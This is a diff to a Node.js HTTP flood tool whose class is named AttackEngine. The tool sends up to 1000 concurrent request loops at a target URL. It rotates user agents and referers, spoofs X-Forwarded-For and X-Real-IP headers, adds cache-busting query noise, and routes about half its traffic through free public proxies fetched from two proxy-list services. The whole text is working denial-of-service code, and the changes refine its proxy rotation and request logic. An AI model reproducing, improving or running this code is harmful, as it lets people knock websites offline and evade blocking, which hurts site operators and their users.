@@ -5,7 +5,7 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 2000); // adjust if needed
+const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1000);
 const REQUEST_TIMEOUT = 8000;
 
 function loadLines(filename) {
@@ -22,23 +22,28 @@ function loadLines(filename) {
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
 
-// Fetch proxies from ProxyScrape API
-async function fetchProxies() {
-    try {
-        const response = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
-        return response.data.split('\n').map(proxy => proxy.trim()).filter(proxy => proxy);
-    } catch (error) {
-        console.error('Error fetching proxies:', error.message);
-        return [];
-    }
-}
-
-// Proxies fallback list
-let PROXIES = [];
-fetchProxies().then(proxies => PROXIES = proxies);
-
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
+
+let PROXIES = [];
+
+async function fetchProxies() {
+    const sources = [
+        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
+        'https://www.proxy-list.download/api/v1/get?type=http'
+    ];
+    let all = [];
+    for (const url of sources) {
+        try {
+            const res = await axios.get(url);
+            const lines = res.data.split('\n').map(p => p.trim()).filter(Boolean);
+            all.push(...lines);
+        } catch (err) {
+            console.error('Failed to fetch proxies from:', url);
+        }
+    }
+    PROXIES = [...new Set(all)]; // Deduplicate
+}
 
 class AttackEngine {
     constructor(target, duration) {
@@ -64,49 +69,46 @@ class AttackEngine {
         return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
     }
 
-    // Function to make request with fallback to proxy
-    async makeRequest(useProxy = false) {
+    async makeRequest() {
+        const useProxy = Math.random() < 0.5 && PROXIES.length > 0;
         const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
         const headers = {
             'User-Agent': this.getRandomUA(),
             'Referer': this.getRandomReferer(),
             'X-Forwarded-For': randomIP,
             'X-Real-IP': randomIP,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
+            'Accept': '*/*',
+            'Connection': 'keep-alive'
         };
 
-        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2)}`;
 
-        let proxy = null;
-        if (useProxy && PROXIES.length > 0) {
-            proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
+        const axiosOptions = {
+            headers,
+            timeout: REQUEST_TIMEOUT,
+            httpAgent: keepAliveHttp,
+            httpsAgent: keepAliveHttps,
+            validateStatus: () => true
+        };
+
+        if (useProxy) {
+            const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
+            const [host, port] = proxy.split(':');
+            axiosOptions.proxy = {
+                host,
+                port: parseInt(port)
+            };
         }
-
-        const agent = useProxy && proxy ? new http.Agent({ proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] } }) : keepAliveHttp;
 
         try {
-            const response = await axios.get(urlWithNoise, {
-                headers,
-                timeout: REQUEST_TIMEOUT,
-                httpAgent: agent,
-                httpsAgent: keepAliveHttps,
-                validateStatus: null
-            });
-            if (response.status === 200) {
-                this.stats.success++;
-                return;
-            }
+            const response = await axios.get(urlWithNoise, axiosOptions);
+            if (response.status === 200) this.stats.success++;
+            else this.stats.errors++;
         } catch {
-            // Proxy fallback will be triggered on failure
+            this.stats.errors++;
         }
 
-        this.stats.errors++;
+        this.stats.total++;
     }
 
     async startWorkers() {
@@ -119,15 +121,7 @@ class AttackEngine {
 
     async workerLoop() {
         while (this.running && Date.now() - this.startTime < this.duration) {
-            this.stats.total++;
-
-            // Default to VPS IP for most requests
-            await this.makeRequest(false); // VPS IP preferred
-
-            // Fall back to proxy if failure occurs
-            if (this.stats.errors > 0) {
-                await this.makeRequest(true); // Use proxy if VPS IP gets blocked or throttled
-            }
+            await this.makeRequest();
         }
     }
 
@@ -142,17 +136,18 @@ class AttackEngine {
             console.log('  ============================================\n');
         };
 
+        await fetchProxies();
         showIntro();
 
         let lastTotal = 0;
         const printStats = setInterval(() => {
             const elapsed = (Date.now() - this.startTime) / 1000;
-            const currentRps = (this.stats.total - lastTotal) / 0.2;
+            const rps = (this.stats.total - lastTotal) / 0.2;
             lastTotal = this.stats.total;
-            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
+            this.stats.peakRps = Math.max(this.stats.peakRps, rps);
 
             process.stdout.write(
-                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
+                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${rps.toFixed(1)} `
             );
         }, 200);
 
